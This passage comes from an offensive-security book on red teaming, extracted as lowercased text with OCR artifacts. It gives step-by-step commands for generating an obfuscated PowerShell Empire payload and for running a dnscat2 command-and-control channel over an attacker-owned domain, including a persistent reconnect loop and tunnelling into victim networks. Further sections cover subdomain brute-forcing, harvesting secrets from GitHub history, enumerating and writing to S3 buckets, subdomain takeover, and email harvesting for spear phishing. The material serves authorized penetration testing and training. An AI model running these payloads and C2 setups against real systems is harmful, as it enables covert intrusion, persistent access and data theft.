- change this to another common server header when you are all done, start your listener execute configuring the payload the payload is the actual malware that will run on the victim 's system. these payloads can run in windows, linux, and osx, but empire is most well-known for its powershell w indows payloads: go to the main menu main create stager available for osx, w indows, linux. w e are going to create a simple batfile as an example, but you can create macros for of fice files or payloads for a rubber ducky usestager [tab twice to see all the dif ferent types] usestager windows/launcher_bat look at all settings info configure all settings set listener http configure the useragent create payload generate review your payload in another terminal window cat /tmp/launcher .bat as you can see, the payload that was created was heavily obfus cated. you can now drop this .bat file on any windows system. of course , you would probably create an office macro or a rubber ducky payload, but this is just one of many examples. if you don't already have powershell installed on your kali image, the best way to do so is to install it manually . installing powershell on kali: apt-get install libunwind8 wget http://security .debian.or g/debiansecurity/pool/updates/main/o/openssl/libssl1.0.0_1.0.1t1+deb7u3_amd64.deb dpkg -i libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb wget http://security .ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1 -7ubuntu0.3_amd64.deb dpkg -i libicu55_55.1-7ubuntu0.3_amd64.deb wget https://github.com/powershell/powershell/releases/download/v6 .0.2/powershell_6.0.2-1.ubuntu.16.04_amd64.deb dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb dnscat2 this tool is designed to create an encrypted command and control (c2) channel over the dns protocol, which is an effective tunnel out of almost every network [https://github.com/iagox86/dnscat2]. c2 and exfiltrat ion over dns provides a great mechanism to hide your traffic, evade network sensors, and get around network restrictions. in many restrictive or production environments, we come across networks that either do not allow outbound traffic or traffic that is heavily restricted/monitored. t o get around these protections, we can use a tool like dnscat2. the reason we are focusing on dnscat2 is because it does not require root privileges and allows both shell access and exfiltration. in many secure environments, direct outbound udp or tcp is restricted. why not leverage the services already built into the infrastructure? many of these protected networks contain a dns server to resolve internal hosts, while also allowing resolutions of external resources. by setting up an authoritative server for a malicious domain we own, we can leverage these dns resolutions to perform command and control of our malware. in our scenario, we are going to set up our attacker domain called “loca1host.com”. this is a doppelganger to “localhost” in the hopes that we can hide our traffic a little bit more. make sure to replace “loca1host.com” to the domain name you own. we are going to configure loca1host.com's dns information so it becomes an authoritative dns server . in this example, we are going to use godaddy's dns configuration tool, but you can use any dns service. setting up an authoritative dns server using godaddy first, make sure to set up a vps server to be your c2 attacking server and get the ip of that server log into your godaddy (or similar) account after purchasing a domain select your domain, click manage, and select advanced dns next, set up hostnames in the dns management to point to your server ns1 (and put the ip of your vps server) ns2 (and put the ip of your vps server) edit nameservers to custom add ns1.loca1host.com add ns2.loca1host.com as seen in the image above, we now have our nameservers pointing to ns1.loca1host.com and ns2.loca1host.com, which both point to our attacker vps server. if you try to resolve any subdomain for loca1host.com (i.e. vpn.loca1host.com), it will try to use our vps server to perform those resolutions. luckily for us, dnscat2 listens on udp port 53 and does all the heavy lifting for us. next, we are going to need to fully set up our attacker server that is acting as our nameserver . setting up the dnscat2 server: sudo su apt-get update apt-get install ruby-dev git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server/ apt-get install gcc make gem install bundler bundle install test to make sure it works: ruby ./dnscat2.rb quick note: if you are using amazon lightsail, make sure to allow udp port 53 for the client code, we will need to compile it to make a binary for a linux payload. compiling the client git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2/client cd /opt/dnscat2/client/ make we should now have a dnscat binary created! (if in w indows: load client/win32/dnscat2.vcproj into v isual studio and hit \"build\") now that we have our authorit ative dns configured, our attacker server running dnscat2 as a dns server , and our malware compiled, we are ready to execute our payload. before we begin, we need to start dnscat on our attacker server . although there are multiple configurations to enable, the main one is configuring the -secret flag to make sure our communication within the dns requests are encrypted. make sure to replace loca1host.com with the domai n name you own and create a random secret string. to start the dncat2 on your attacker server: screen ruby ./dnscat2.rb loca1host.com --secret 39dfj3hdsfajh37e8c902j let's say you have some sort of rce on a vulnerable server . you are able to run shell commands and upload our dnscat payload. to execute our payload: ./dnscat loca1host.com --secret 39dfj3hdsfajh37e8c902j this will start dnscat, use our authoritative server , and create our c2 channel. one thing i have seen is that there are times when dnscat2 dies. this could be from large file transfers or something just gets messed up. to circumvent these types of issues, i like to make sure that my dnscat payload returns. for this, i generally like to start my dnscat payload with a quick bash script: nohup /bin/bash -c \"while true; do /opt/dnscat2/client/dnscat loca1host.com --secret 39dfj3hdsfajh37e8c902j --maxretransmits 5; sleep 3600; done\" > /dev/null 2>&1 & this will make sure that if the client side payload dies for any reason, it will spawn a new instance every hour. sometimes you only have one chance to get your payloads to run, so you need to make them count! lastly , if you are going to run this payload on windows, you could use the dnscat2 payload or... why not just do it in powershell?! luke baggett wrote up a powershell version of the dnscat client here: https://github.com/lukebaggett/dnscat2-powershell. the dnscat2 connection after our payload executes and connects back to our attacker server , we should see a new encr ypted and verified message similar to below . by typing \"window\" dnscat2 will show all of your sessions. currently , we have a single command session called \"1\". we can spawn a terminal style shell by interacting with our command session: interact with our first command sessions window -i 1 start a shell sessions shell back out to the main session ctrl-z interact with the 2 session - sh window -i 2 now , you should be able to run all shell commands (i.e. ls) although this isn't the fastest shell, due to the fact that all communication is over dns, it really gets around those situations where a meterpreter or similar shell just won't work. what is even better about dnscat2 is that it fully supports tunneling. this way, if we want to use an exploit from our host system, use a browser to tunnel internal websites, or even ssh into another box, it is all possible. tunnel in dnscat2 there are many times we want to route our traffic from our attacker server through our compromised host, to other internal servers. the most secure way to do this with dnscat2 is to route our traffic through the local port and then tunnel it to an internal system on the network. an example of this can be accomplished by the following command inside our command session: listen 127.0.0.1:9999 10.100.100.1:22 once the tunnel is created, we can go back to our root terminal window on our attacker machine, ssh to localhost over port 9999, and authenticate to an internal system on the victim's network. this will provide all sorts of fun and a great test to see if your customer's networks can detect massive dns queries and exfiltration. so, what do the request and responses look like? a quick wireshark dump shows that dnscat2 creates massive amounts of different dns requests to many different long subdomains. now , there are many other protocols that you might want to test. for example, nishang has a powershell based icm p shell (http://bit.ly/2gxhdnz) that uses https://github.com/inquisb/icm psh as the c2 server . there are other icmp shells like https://github.com/jamesbarlow/icmptunnel, https://github.com/dhavalkapil/icmptunnel and http://code.gerade.or g/hans/. p0wnedshell as stated on p0wnedshell’ s github page, this tool is “an offensive powershell host application written in c# that does not rely on powershell.exe but runs powershell commands and functions within a powershell runspace environment (.net). it has a lot of offensive powershell modules and binaries included to make the process of post exploitation easier. what we tried was to build an “all in one” post exploitation tool which we could use to bypass all mitigations solutions (or at least some off), and that has all relevant tooling included. you can use it to perform modern attacks withi n active directory environments and create awareness within your blue team so they can build the right defense strategies.” [https://github.com/cn33liz/p0wnedshell] pupy shell pupy is “an opensource, cross-platform (windows, linux, osx, android) remote administration and post-exploitation tool mainly written in python.” [https://github.com/n1nj4sec/pupy]. one of the awesome features of pupy is that you can run pytho n across all of your agents without having a python actually installed on all of your hosts. so, if you are trying to script out a lot of your attacks in a custom framework, pupy is an easy tool with which to do this. poshc2 poshc2 is “a proxy aware c2 framework written completely in powershell to aid penetration testers with red teaming, post-exploitation and lateral movement. the tools and modules were developed off the back of our successful powershell sessions and payload types for the metasploit framework. powershell was chosen as the base language as it provides all of the functiona lity and rich features required without needing to introduce multiple languages to the framework.” [https://github.com/nettitude/poshc2] merlin merlin (https://github.com/ne0nd0g/merlin) takes advantage of a recently developed protocol called http/2 (rfc7540). per medium, \"http/2 communications are multiplexed, bi-direction connections that do not end after one request and response. additionally , http/2 is a binary protocol that makes it more compact, easy to parse, and not human reada ble without the use of an interpreting tool.” [https://medium.com/@ne0nd0g/introducing-merlin-645da3c635a#df21] merlin is a tool written in go, looks and feels similar to powershell empire, and allows for a lightweight agent. it doesn't support any types of post exploitation modules, so you will have to do it yourself. nishang nishang (https: //github.com/samratashok/nishang) is a framework and collection of scripts and payloa ds which enables usage of powershell for offensive securi ty, penetration testing and red teaming. nishang is useful during all phases of penetration testing. although nisha ng is really a collection of amazing powershell scripts, there are some scripts for lightweight command and control. conclusion now , you are finally prepared to head into battle with all of your tools and servers configured. being ready for any scenario will help you get around any obstacle from network detection tools, blocked protocols, host based security tools, and more. for the labs in this book, i have created a full virtual machin e based on kali linux with all the tools. this vmw are virtual machine can be found here: http://thehackerplaybook.com/get.php?type=thp-vm . within the thp archive, there is a text file named list_of_t ools.txt which lists all the added tools. the default username/password is the standard root/toor . 2 before the snap - red team recon in the last thp, the before the snap section focused on using different tools such as recon-ng, discover , spiderfoot, gitrob, masscan, sparta, http screenshot, vulnerability scanners, burp suite and more. these were tools that we could use either externally or internally to perform reconnaissance or scanning of our victim's infrastructure. we are going to continue this tradition and expand on the reconnaissance phase from a red team perspective. monitoring an environment for red team campaigns, it is often about opportunity of attack . not only do you need to have your attack infrastructure ready at a whim, but you also need to be constantly looking for vulnerabilities. this could be done through various tools that scan the environments, looking for services, cloud misconfig urations, and more. these activities allow you to gather more information about the victim’ s infrastructure and find immediate avenues of attack. regular nmap diffing for all our clients, one of the first things we do is set up different monitoring scrip ts. these are usually just quick bash scripts that email us daily diffs of a client's network . of course, prior to scanning, make sure you have proper authorization to perform scanning. for client networks that are generally not too large, we set up simple cronjob to perform external port diffing. for example, we could create a quick linux bash script to do the hard work (remember to replace the ip range): #!/bin/bash mkdir /opt/nmap_dif f d=$(date +%y -%m-%d) y=$(date -d yesterday +%y -%m-%d) /usr/bin/nmap -t4 -ox /opt/nmap_dif f/scan_$d.xml 10.100.100.0/24 > /dev/null 2>&1 if [ -e /opt/nmap_dif f/scan_$y .xml ]; then /usr/bin/ndif f /opt/nmap_dif f/scan_$y .xml /opt/nmap_dif f/scan_$d.xml > /opt/nmap_dif f/diff.txt fi this is a very basic script that runs nmap every day using default ports and then uses ndiff to compare the results. we can then take the output of this script and use it to notify our team of new ports discovered daily . in the last book, we talked heavily about the benefits of masscan (https://github.com/robertdavidgraham/masscan) and how much faster it is than nmap. the developers of masscan stated that, with a large enough network pipeline , you could scan the entire internet in 6 minutes. the one issue we have seen is with masscan's reliability when scanning large ranges. it is great for doing our initial reconnaissance, but generally isn't used for dif fing. lab: labs in thp3 are completely optional. in some sections, i have included addition labs to perform testing or for areas that you can expan d on. since this is all about learning and finding your own passion, i highly recommend you spend the time to make our tools better and share it with the community . build a better network dif f scanner: build a better port list than the default nmap (i.e. nmap defaul t misses ports like redis 6379/6380 and others) implement nmap banners keep historical tracking of ports build email alerting/notification system check out dif f slack alerts: http://bit.ly/2h1o5a w web scr eenshots other than regularly scanning for open ports/services, it is important for red teams to also monitor for different web applications. we can use two tools to help monitor for application changes. the first web screenshot tool that we commonly use is http screenshot (https://github.com/breenmachine/httpscreenshot). the reason httpscreenshot is so powerful is that it uses masscan to scan large networks quickly and uses phantomjs to take screencaptu res of any websites it detects. this is a great way to get a quick layout of a large internal or external network. please remember that all tool references in this book are run from the thp modified kali virtual machine. you can find the virtual machine here: http://thehackerplaybook.com/get.php?type=thp-vm. the username password is the default: root/toor . cd /opt/httpscreenshot/ edit the networks.txt file to pick the network you want to scan: gedit networks.txt ./masshttp.sh firefox clusters.html the other tool to check out is eyewitness (https://github.com/christ runcer/eyew itness). eyewitness is another great tool that takes an xml file from nmap output and screenshots webpages, rdp servers, and vnc servers. lab: cd /opt/eyew itness nmap [ip range]/24 --open -p 80,443 -ox scan.xml python ./eyew itness.py -x scan.xml --web cloud scanning as more and more companies switch over to using different cloud infrastructures, a lot of new and old attacks come to light. this is usually due to misconfigurations and a lack of knowledge on what exactly is publicly facing on their cloud infrastructure. regardless of amazon ec2, azure, google cloud, or some other provider , this has become a global trend. for red teamers, a problem is how do we search on different cloud environments? since many tenants use dynamic ips, their servers might not only change rapidly , but they also aren’ t listed in a certain block on the cloud provider . for example, if you use aws, they own huge ranges all over the world. based on which region you pick, your server will randomly be dropped into a /13 cidr range. for an outsider , finding and monitoring these servers isn't easy . first, it is important to figure out where the ip ranges are owned by different providers. some of the examples are: amazon: http://bit.ly/2vusjed azure: http://bit.ly/2r7rher google cloud: http://bit.ly/2haszfm as you can tell these ranges are huge and scanning them manually would be very hard to do. throughout this chapter , we will be reviewing how we can gain the information on these cloud systems. network/service sear ch engines to find cloud servers, there are many great resources freely available on the internet to perform reconnaissance on our targets. we can use everything from google all the way to third party scanning services. using these resources will allow us to dig into a company and find information about servers, open services, banners, and other details passively . the company will never know that you queri ed for this type of information . let’s see how we use some of these resources as red t eamers. shodan shodan (https://www .shodan.io) is a great service that regularly scans the internet, grabbing banners, ports, information about networks, and more. they even have vulnerability information like heartbleed. one of the most fun uses for shodan is looking through open web cams and playing around with them. from a red team perspective, we want to find information about our victims. a few basic search queries: title: search the content scraped from the html tag html: search the full html content of the returned page product: search the name of the software or product identified in the banner net: search a given netblock (example: 204.51.94.79/18) we can do some searches on shodan for cyberspacekittens: cyberspacekittens.com search in the t itle html t ag title:cyberspacekittens search in the context of the page html:cyberspacekittens.com note, i have noticed that shodan is a little slow in its scans. it took more than a month to get my servers scanned and put into the shodan database. censys.io censys continu ally monitors every reachable server and device on the internet, so you can search for and analyze them in real time. you will be able to understa nd your network attack surface, discover new threats, and assess their global impact [http s://censys.io/]. one of the best features of censys is that it scrapes inform ation from ssl certificates. typically , one of the major difficulties for red teamers is finding where our victim's servers are located on cloud servers. luckily , we can use censys.io to find this information as they already parse this data. the one issue we have with these scans is that they can someti me be days or weeks behind. in this case, it took one day to get scanned for title information. additionally , after creating an ssl certificate on my site, it took four days for the information to show up on the censys.io site. in terms of data accuracy , censys.io was decently reliable. below , we ran scans to find info about our target cyberspacek ittens.com. by parsing the server's ssl certificate, we were able to identify that our victim's server was hosted on a ws. there is also a censys script tool to query it via a script ed process: https://github.com/christophetd/censys-subdomain-finder . manually parsing ssl certificates we commonly find that compan ies do not realize what they have available on the internet. especially with the increase of cloud usage, many companies do not have acls properly implemented. they believe that their servers are protected, but we discover that they are publicly facing. these include redis databases, jenkin servers, tomcat management, nosql database s, and more – many of which led to remote code execution or loss of pii. the cheap and dirty way to find these cloud servers is by manually scanning ssl certificates on the internet in an automated fashi on. we can take the list of ip ranges for our cloud providers and scan all of them regularly to pull down ssl certificates. looking at the ssl certs, we can learn a great deal about an organization. from the scan below of the cyberspacekittens range, we can see hostnames in certificates with .int. for internal servers, .dev. for development, vpn. for vpn servers, and more. many times you can gain intern al hostnames that might not have public ips or whitelisted ips for their internal networks. to assist in scanning for hostnames in certificates, sslscrape was developed for thp 3. this tool utilizes masscan to quickly scan large networks. once it identifies services on port 443, it then strips the hostnames in the certificates. sslscrape (https://github.com/cheetz/sslscrape): cd /opt/sslscrape python ./sslscrape.py [ip address cidr range] examples of cloud ip addresses: amazon: http://bit.ly/2vusjed azure: http://bit.ly/2r7rher google cloud: http://bit.ly/2haszfm throughout this book, i try to provide examples and an initial framework. however , it is up to you to develop this further . i highly recommend you take this code as a start, save all hostnames to a database, make a web ui frontend, conne ct additional ports that might have certs like 8443, and maybe even look for some vulnerabilities like .git/.svn style repos. subdomain discovery in terms of identifying ip ranges, we can normally look up the company from public sources like the american registry for interne t numbers (arin) at https://www .arin.net /. we can look up ip addre ss space to owners, search networks owned by companies, autonomo us system numbers by organization, and more. if we are looking outside north america, we can look up via afrinic (africa), apnic (asia ), lacnic (latin america), and ripe ncc (europe). these are all publicly available and listed on their servers. you can look up any hostname or fqdn to find the owner of that domain through many available public sources (one of my favorites to quickly lookup ownership is https://cen tralops.net/co/domaindossier .aspx). what you can't find listed anywhere are subdomains. subdomain information is stored on the target's dns server versus registered on some central public registration system. you have to know what to search for to find a valid subdomain. why are subdomains so important to find for your victim targets? a few reasons are: some subdomains can indicate the type of server it is (i.e. dev, vpn, mail, internal, test). for example , mail.cyberspacekittens.com. some servers do not respond by ip. they could be on shared infrastructure and only respond by fully qualified domains. this is very common to find on cloud infrastructure. so you can nmap all day, but if you can’t find the subdomain, you won' t really know what applications are behind that ip . subdomains can provide information about where the target is hosting their servers. this is done by finding all of a company's subdomains, performing reverse lookups, and finding where the ips are hosted. a company could be using multiple cloud providers and datacenters. we did a lot of discovery in the last book, so let's review some of the current and new tools to perform better discovery . feel free to join in and scan the cyberspacekittens.com domain. discover scripts discover scripts (https://github.com/leebaird/discover) tool is still one of my favorite recon/discovery tools discussed in the last book. this is because it combines all the recon tools on kali linux and is maintained regularly . the passive domain recon will utilize all the following tools: passive uses arin, dnsrecon, goofile, goog-mail, goohost, theharvester , metasploit, urlcrazy , whois, multiple websites, and recon-ng. git clone https://github.com/leebaird/discover /opt/discover/ cd /opt/discover/ ./update.sh ./discover .sh domain passive [company name] [domain name] firefox /root/data/[domain]/index.htm the best part of discover scripts is that it takes the information it gathers and keeps searching based on that information. for example, from searching through the public pgp repository it might identify emails and then use that information to search have i been pwned (through reconng). that will let us know if any passwords have been found through publicly-released compromises (which you will have to find on your own). knock next, we want to get a good idea of all the servers and domains a company might use. although there isn’t a central place where subd omains are stored, we can bruteforce different subdomains with a tool, such as knock, to identify what servers or hosts might be available for attack. knockpy is a python tool designed to enumerate subdomains on a target domain through a wordlist. knock is a great subdomain scan tool that takes a list of subdomains and checks it to see if it resolves. so if you have cyberspacekittens.com, knock will take this wordlist (http://bit.ly/2jokuyj), and see if there are any subdomains for [subdomain].cyberspacekittens.com. now , the one caveat here is that it is only as good as your word list. therefore, having a better wordlist increases your chances of finding subdomains. one of my favorite subdomains is created by jhaddix and is located here: http://bit.ly/2qwxrxb. subdomains are one of those things that you should always be collecting. some other good lists can be found on your thp kali image under /opt/seclists or here: https://github.com/danielmiessler/seclists/tree/master/discovery/dns. lab: find all the subdomains for cyberspacekittens.com: cd /opt/knock/knockpy python ./knockpy .py cyberspacekittens.com this uses the basic wordlist from knock. t ry downloading and using a much lar ger wordlist. t ry using the http://bit.ly/2qwxrxb list using the -u switch. (i.e. python ./knockpy .py cyberspacekittens.com -u all.txt). what types of differences did you find from discover scripts? what types of domains would be your first targets for attacks or used with spearphishing domain attacks? go and give it a try in the real world. go find a bug bounty program and look for juicy-looking subdomains. sublist3r as previously mentioned, the problem with knock is that it is only as good as your wordlist . some companies have very unique subdomai ns that can't be found through a common wordlist. the next best resource to go to are search engines. as sites get spidered, files with links get analyzed and scraped public resources become available, which means we can use search engines to do the hard work for us. this is where we can use a tool like sublist3r . note, using a tool like this uses different \"google dork\" style search queries that can look like a bot. this could get you temporarily blacklisted and require you to fill out a captcha with every request, whic h may limit the results from your scan. to run sublister: cd /opt/sublist3r python sublist3r .py -d cyberspacekittens.com -o cyberspacekittens.com notice any results that might have never been found from subdomain bruteforcing? again, try this against a bug bounty program to see significant dif ferences between bruteforcing and using search engines. *there is a forked version of sublist3r that also performs subdomain checking: https://github.com/plazmaz/sublist3r . subbrute the last subdomain tool is called subbrute. subbrute is a communitydriven project with the goal of creating the fastest, and most accurate subdomain enumeration tool. some of the magic behind subbrute is that it uses open resolvers as a kind of proxy to circumvent dns rate-limiting (https://www .us-cert.gov/ncas/alerts/t a13-088a). this design also provides a layer of anonymity , as subbrute does not send traffic directly to the tar get's name servers. [https://github.com/therook/subbrute] not only is subbrute extremely fast, it performs a dns spider feature that crawls enumerated dnsrecords. t o run subbrute: cd /opt/subbrute ./subbrute.py cyberspacekittens.com we can also take subbrute to the next level and combine it with massdns to perform very high-performance dns resolution (http://bit.ly/2emkihg). github github is a treasure trove of amazing data. there have been a number of penetration tests and red team assessments where we were able to get passwords, api keys, old sourc e code, internal hostnames/ips, and more. these either led to a direct compromise or assisted in another attack. what we see is that many developers either push code to the wrong repo (sending it to their public repository instead of their company’ s private repository), or accidentally push sensitive material (like passwords) and then try to remove it. one good thing with github is that it tracks every time code is modified or deleted. that means if sensitive code at one time was pushed to a repository and that sensitive file is deleted, it is still tracked in the code changes. as long as the repository is public, you will be able to view all of these changes. we can either use github search to identify certain hostnames/or ganizational names or even just use simple google dork search, for example: site:github.com + \"cyberspacekittens”. try searching bug bounty progr ams using different organizations instead of searching for cyberspacekittens for the following examples. through all your searching, you come across: https://github.com/cyberspacekittens/dnscat2 (modified example for github lab). you can manually take a peek at this repository , but usually it will be so large that you will have a hard time going through all of the projects to find anything juicy . as mentioned before, when you edit or delete a file in github, everything is tracked. fortunately for red teamers, many people forget about this feature. therefo re, we often see people put sensitive information into github, delete it, and not realize it's still there! let's see if we can find some of these gems. truffle hog truffle hog tool scans different commit histories and branches for high entropy keys, and prints them. this is great for finding secrets, passwords, keys, and more. let's see if we can find any secrets on cybers pacekittens' github repository . lab: cd /opt/truf flehog/truf flehog python truf flehog.py https://github.com/cyberspacekittens/dnscat2 as we can see in the commit history , aws keys and ssh keys were removed from server/controller/csk.config, but if you look at the current repo, you won't find this file: https://github.com/cheetz/dnscat2/tree/master/server/controller . even better (but a little more complicated to set up) is git-all-secrets from (https://github.com/anshumanbh/git-all-secrets). git-all-secrets is useful when looking through large organizations. you can just point to an organization and have it clone the code locally , then scan it with t ruffle-hog and repo-supervisor . you will first need to create a github access token, which is free by creating a githu b and selecting generate new token in the settings. to run git-all-secrets: cd /opt/git-all-secrets docker run -it abhartiya/tools_gitallsecrets:v3 repourl=https://github.com/cyberspacekittens/dnscat2 -token= [api key] -output=results.txt this will clone the repo and start scanning. y ou can even run through whole or ganizations in github with the -or g flag. after the container finishes running, retrieve the container id by typing: docker ps -a once you have the container id, get the results file from the container to the host by typing: docker cp <container -id>:/data/results.txt . cloud as we spoke prior , cloud is one area where we see a lot of companies improperly securing their environment. the most common issues we generally see are: amazon s3 missing buckets: https://hackerone.com/reports/121461 amazon s3 bucket permissions: https://hackerone.com/reports/128088 being able to list and write files to public a ws buckets: aws s3 ls s3://[bucketname] aws s3 mv test.txt s3://[bucketname] lack of logging before we can start testing misc onfigurations on different aws buckets, we need to first identify them. we are going to try a couple different tools to see what we can discover on our victim’ s aws infrastructure. s3 bucket enumeration there are many tools that can perform s3 bucket enumeration for aws. these tools generally take keywords or lists, apply multiple permutations, and then try to identify different buckets. for example, we can use a tool called slurp (https://github.com/bbb31/slurp) to find information about our target cyberspacekittens: cd /opt/slurp ./slurp domain -t cyberspacekittens.com ./slurp keyword -t cyberspacekittens bucket finder another tool, bucket finder , will not only attempt to find different buckets, but also download all the content from those buckets for analysis: wget https://digi.ninja/files/bucket_finder_1.1.tar .bz2 -o bucket_finder_1.1.tar .bz2 cd /opt/bucket_finder ./bucket_finder .rb --region us my_words --download you have been running discovery on cyber space kittens’ infrastructure and identify one of their s3 buckets (cyberspacekittens.s3.amazonaws.com). what are your first steps in retrieving what you can and cannot see on the s3 bucket? you can first pop it into a browser and see some information: prior to starting , we need to create an aws account to get an access key id. you can get yours for free at amazon here: https://aws.amazon.com/s/dm/optimization/server -side-test/freetier/free_np/. once you create an account, log into aws, go to your security credentials (https://amzn.to/2itaysr), and then to access keys. once you have your aws acce ss id and secret key, we can query our s3 buckets. query s3 and download everything: install awscli sudo apt install awscli configure credentials aws configure look at the permissions on cyberspacekittens' s3 bucket aws s3api get-bucket-acl --bucket cyberspacekittens read files from the s3 bucket aws s3 ls s3://cyberspacekittens download everything in the s3 bucket aws s3 sync s3://cyberspacekittens . other than query s3, the next thing to test is writing to that bucket. if we have write access, it could allow complete rce of their applic ations. we have often seen that when files stored on s3 buckets are used on all of their pages (and if we can modify these files), we can put our malicious code on their web application servers. writing to s3: echo \"test\" > test.txt aws s3 mv test.txt s3://cyberspacekittens aws s3 ls s3://cyberspacekittens *note, write has been removed from the everyone group. this was just for demonstration. modify access contr ols in a ws buckets when analyzing aws security , we need to review the controls around permissions on objects and buckets. objects are the individu al files and buckets are logical units of storage. both of these permissions can potentially be modified by any user if provisioned incorrectly . first, we can look at each objec t to see if these permissions are configured correctly: aws s3api get-object-acl --bucket cyberspacekittens --key ignore.txt we will see that the file is only writeable by a user named “secure”. it is not open to everyone. if we did have write access, we could use the putobject in s3api to modify that file. next, we look to see if we can modify the buckets themselves. this can be accomplished with: aws s3api get-bucket-acl --bucket cyberspacekittens again, in both of these cases, read is permissioned globally , but full_control or any write is only allowed by an account called “secure”. if we did have access to the bucket, we could use the --grant-fullcontrol to give ourselves full control of the bucket and objects. resources: https://labs.detectify .com/2017/07/13/a-deep-dive-into-awss3-access-controls-taking-full-control-over -your -assets/ subdomain t akeovers subdomain takeovers are a common vulnerability we see with almost every company these days. what happens is that a company utilizes some third party cms/content/cloud provider and points their subdomains to these platforms. if they ever forget to configure the third party service or deregister from that server , an attacker can take over that hostname with the third party . for example, you register an s3 amazon bucket with the name testlab.s3.amazonaws.com. you then have your company’ s subdomain testlab.company .com point to testlab.s3.amazonaws.com. a year later, you no longe r need the s3 bucket testlab.s3.amazonaws.com and deregister it, but forget the cname redirect for testlab.company .com. someone can now go to aws and set up testlab.s3.amazon.com and have a valid s3 bucket on the victim’ s domain. one tool to check for vulnerable subdomains is called tko-subs. we can use this tool to check whether any of the subdomains we have found pointing to a cms provider (heroku, github, shopify , amazon s3, amazon cloudfront, etc.) can be taken over . running tko-subs: cd /opt/tko-subs/ ./tkosubs -domains=list.txt -data=providers-data.csv output=output.csv if we do find a dangling cnam e, we can use tko-subs to take over github pages and heroku apps. otherwise, we would have to do it manually . two other tools that can help with domain takeovers are: hostilesubbruteforcer (https://github.com/nahamsec/hostilesubbruteforcer) autosubt akeover (https://github.com/jordyzomer/autosubt akeover) want to learn more about aws vulnerabilities? a great ctf aws walkthrough: http://flaws.cloud/ . emails a huge part of any social engineering attack is to find email addresses and names of employees. we used discover script in the previous chapters, which is great for collecting much of this data. i usually start with discover scripts and begin digging into the other tools. every tool does things slightly differently and it is beneficial to use as many automate d processes as you can. once you get a small list of emails, it is good to understand their email format. is it firstname.lastname @cyberspacekitten.com or is it first initial.lastname @cyberspacekittens.com? once you can figure out their format, we can use tools like linkedin to find more employees and try to identify their email addresses. simplyemail we all know that spear phishing is still one of the more successful avenues of attack. if we don’t have any vulnerabilities from the outside, attacking users is the next step. to build a good list of email addresses, we can use a tool like simplyemail. the output of this tool will provide the email address format of the company and a list of valid users lab: find all email accounts for cnn.com cd /opt/simplyemail ./simplyemail.py -all -v -e cyberspacekittens.com firefox cyberspacekittens.com<date_time>/email_list.html this may take a long time to run as it checks bing, yahoo, google, ask search, pgp repos, files, and much more. this may also make your network look like a bot to search engines and may require captchas if you produce too many search requests. run this against your company . do you see any email addresses that you recognize? these might be the first email addresses that could be targeted in a lar ge scale campaign. past br eaches one of the best ways to get email accounts is to continually monitor and capture past breaches. i don't want to link directly to the breaches files, but i will reference some of the ones that i have found useful: 1.4 billion password leak 2017: https://thehackernews.com/2017/12/data-breach-passwordlist.html adobe breach from 2013: https://nakedsecurity .sophos.com/2013/1 1/04/anatomy-of-apassword-disaster -adobes-giant-sized-cryptographic-blunder/ pastebin dumps: http://psbdmp.ws/ exploit.in dump pastebin google dork: site:pastebin.com intext:cyberspacekittens.com additional open source resources i didn't know exactly where to put these resources, but i wanted to provide a great collection of other resources used for red team style campaigns. this can help identify people, locations, domain information, social media, image analysis, and more. collection of osint links: https://github.com/ivmachiavelli/osint_t eam_links osint framework: http://osintframework.com/ c o n c l u s i o n in this chapter we went over all the different reconnaissance tactics and tools of the trade. this is just a start as many of these techniques are manual and require a fair amount of time to execute. it is up to you to take this to the next level, automate all these tools, and make the recon fast and efficient. 3 the throw - web application exploitation over the past couple of years, we have seen some critical, externally-facing web attacks. everything from the apache struts 2 (although not confirmed for the equifax breach - http://bit.ly/2hokw i0), panera bread (http://bit.ly/2qwemxh), and uber (http://ubr .to/2hio2tz). there is no doubt we will continue to see many other severe breaches from public internet facing end-points. the security industry , as a whole, runs in a cyclical pattern. if you look at the different layers of the osi model, the attacks shift to a different layer every other year. in terms of web, back in the early 2000s, there were tons of sqli and rfi type exploits. however , once companies started to harden their external environments and began performing external penetration test, we, as attackers, moved to layer 8 attacks focusing on social engineering (phishing) for our initial entry point. now , as we see organizations improving their internal security with next generation endpo int/firewall protection, our focus is shifting back onto application exploitation. we have also seen a huge complexity increase in applications, apis, and languages, which has reopened many old and even new vulnerabilities. since this book is geared more toward red teaming concepts, we will not go too deeply into all of the different web vulnerabilities or how to manually exploit them. this won't be your checklist style book. you will be focusing on vulnerabilities that red teamers and bad guys are seeing in the real world, which lead to the compromising of pii, ip, networks, and more. for those who are looking for the very detailed web methodologies, i always recommend starting with the owasp testing guide (http://bit.ly/2gzbvzd and https://www .owasp.or g/images/1/19/otgv4.pdf). note, since as many of the attacks from thp2 have not changed, we won't be repeating examples like sqlmap, idor attacks, and csrf vulnerabilities in the following exercises. instead, we will focus on newer critical ones. bug bounty programs: before we start learning how to exploit web applications, let’s talk a little about bug boun ty programs. the most common question we get is, “how can i continually learn after these trainings?” my best recommendation is to do it against real, live systems. you can do training labs all day, but without that real-life experience, it is hard to grow . one caveat though: on average, it takes about 3-6 months before you begin to consis tently find bugs. our advice: don’t get frustrated, keep up-to-date with other bug bounty hunters , and don’t forget to check out the older programs. the more common bug bounty programs are hackerone (https://www .hackerone.com), bugcrowd (https://bugcrowd.com/programs) and synack (https://www .synack.com/red-team/). there are plenty of other ones out there as well (https://www .vulnerability-lab.com/list-of-bugbounty-programs.php). these programs can pay anywhere from free to $20k+. many of my students find it daunting to start bug hunting. it really requires you to just dive in, allot a few hours a day, and focus on underst anding how to get that sixth sense to find bugs. generally , a good place to start is to look at no-reward bug bount y programs (as the pros won’ t be looking here) or at large older program s like yahoo. these types of sites tend to have a massive scope and lots of legacy servers. as mentioned in prior books, scoping out pentests is important and bug bounties are no different. many of the programs specify what can and cannot be done (i.e., no scanning, no automated tools, which domains can be attacked, etc.). sometimes you get lucky and they allow *.company .com, but other times it might be limited to a single fqdn. let’s look at ebay , for example, as they have a public bug bounty program. on their bug bounty site (http://pages.ebay .com/securitycenter/researchers.html), they state guidelines, eligible domains, eligible vulnerabilities, exclusio ns, how to report, and acknowledgements: how you report vulnerabilities to the company is generally just as important as the finding itself. you want to make sure you provide the company with as much detail as possible. this would include the type of vulnerability , severity/criticality , what steps you took to 